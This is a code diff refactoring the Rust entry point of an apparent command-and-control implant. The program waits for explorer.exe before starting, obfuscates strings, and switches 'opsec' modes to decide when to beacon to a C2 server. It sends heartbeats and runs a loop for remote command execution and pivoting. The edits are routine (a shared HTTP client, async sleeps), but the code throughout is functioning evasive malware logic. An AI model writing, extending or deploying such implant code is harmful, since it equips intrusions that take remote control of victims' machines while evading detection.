@@ -21,11 +21,6 @@ use std::sync::Arc;
 use log::{info, warn, error};
 use std::env;
 
-// Helper function to get current timestamp
-fn now_timestamp() -> std::time::Instant {
-    std::time::Instant::now()
-}
-
 // Dormant startup function
 // This function is called on Windows to wait for the system to be idle before starting the agent
 // It checks for the presence of explorer.exe and waits for up to 10 minutes
@@ -36,7 +31,7 @@ fn dormant_startup() {
     use obfstr::obfstr;
 
     let mut sys = System::new_with_specifics(RefreshKind::everything());
-    let start = now_timestamp();
+    let start = std::time::Instant::now();
     // Wait up to 10 minutes or until explorer.exe is running
     while start.elapsed().as_secs() < 600 {
         sys.refresh_specifics(RefreshKind::everything());
@@ -58,6 +53,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let config = agent::config::AgentConfig::load()?;
     info!("[CONFIG] Loaded agent config: {:?}", config);
+
+    // Build HTTP client once for use in opsec loops
+    let client = config.build_http_client()?;
 
     // Channel for pivot frames
     let (pivot_tx, mut pivot_rx) = tokio::sync::mpsc::channel(100);
@@ -91,7 +89,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let server_addr = env::args()
         .nth(1)
         .unwrap_or_else(|| config.get_server_url());
-    
+
     let agent_id = config.payload_id.clone();
     info!("[INFO] Agent ID: {}", agent_id);
 
@@ -103,35 +101,34 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         match current_mode {
             agent::opsec::AgentMode::BackgroundOpsec => {
                 info!("[OPSEC] Safe to beacon home. Starting agent.");
-                break; // Exit this loop to start agent_loop
+                break;
             }
             agent::opsec::AgentMode::ReducedActivity => {
                 info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");
 
-                if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
+                if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(&config, &client, &server_addr, &agent_id).await {
                     error!("[OPSEC] Heartbeat failed in ReducedActivity (initial loop): {}. C2 failure counter updated internally.", e);
                 } else {
                     info!("[OPSEC] Heartbeat successful in ReducedActivity (initial loop).");
                 }
-                
-                std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
+
+                tokio::time::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)).await;
             }
             agent::opsec::AgentMode::FullOpsec => {
                 info!("[OPSEC] Not safe to beacon home. Staying in FullOpsec (encrypted and dormant).");
-                std::thread::sleep(Duration::from_secs(5)); // Short sleep, rely on score decay/cooldown
+                tokio::time::sleep(Duration::from_secs(5)).await;
             }
         }
     }
     // --- End Initial Opsec Check Loop ---
 
-    // --- Main Agent Execution Loop --- 
-    loop {        
+    // --- Main Agent Execution Loop ---
+    loop {
         // agent_loop handles C2 comms and command execution
         if let Err(e) = agent::commands::command_shell::agent_loop(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
             error!("[ERROR] Agent loop error: {}. Preparing to re-assess OPSEC state.", e);
-            // Don't immediately exit; re-assess below
         }
-        
+
         info!("[OPSEC] Returned from agent_loop or error occurred. Re-assessing OPSEC state...");
 
         // Re-assessment Loop (similar to initial check)
@@ -140,22 +137,22 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             match current_mode {
                 agent::opsec::AgentMode::BackgroundOpsec => {
                     info!("[OPSEC] Safe to beacon home again. Resuming agent_loop.");
-                    break; // Exit re-assessment loop, main loop will call agent_loop again
+                    break;
                 }
                 agent::opsec::AgentMode::ReducedActivity => {
                     info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");
 
-                    if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
+                    if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(&config, &client, &server_addr, &agent_id).await {
                         error!("[OPSEC] Heartbeat failed in ReducedActivity (re-assessment loop): {}. C2 failure counter updated internally.", e);
                     } else {
                         info!("[OPSEC] Heartbeat successful in ReducedActivity (re-assessment loop).");
                     }
-                    
-                    std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
+
+                    tokio::time::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)).await;
                 }
                 agent::opsec::AgentMode::FullOpsec => {
                     info!("[OPSEC] Not safe to beacon home. Staying in FullOpsec (encrypted and dormant).");
-                    std::thread::sleep(Duration::from_secs(5)); // Short sleep, rely on score decay/cooldown
+                    tokio::time::sleep(Duration::from_secs(5)).await;
                 }
             }
         }
